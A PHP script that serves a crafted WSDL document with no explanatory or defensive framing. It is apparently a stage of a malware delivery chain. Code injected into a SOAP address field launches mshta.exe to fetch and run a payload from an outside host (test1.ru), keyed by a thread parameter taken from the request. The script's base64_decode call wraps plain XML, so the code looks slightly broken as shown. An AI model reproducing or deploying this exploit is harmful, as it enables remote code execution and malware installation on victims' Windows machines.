<?php
$thread=$_GET['thread'];
echo str_replace("THREADID", $thread, base64_decode("
<definitions
    xmlns="http://schemas.xmlsoap.org/wsdl/"
    xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
    xmlns:suds="http://www.w3.org/2000/wsdl/suds"
    xmlns:tns="http://schemas.microsoft.com/clr/ns/System"
    xmlns:ns0="http://schemas.microsoft.com/clr/nsassem/Logo/Logo">
    <portType name="PortType"/>
    <binding name="Binding" type="tns:PortType">
        <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
        <suds:class type="ns0:Image" rootType="MarshalByRefObject"></suds:class>
    </binding>
    <service name="Service">
        <port name="Port" binding="tns:Binding">
            <soap:address location="http://localhost_C:\Windows\System32\mshta.exe_http://test1.ru/newbuild/t.php?thread=THREADID"/>
                        <soap:address location="\\;\\;
                                System.Diagnostics.Process.Start(_url.Split('_')[1], _url.Split('_')[2]);
                         //"/>
        </port>
    </service>
</definitions> 
"));
?>
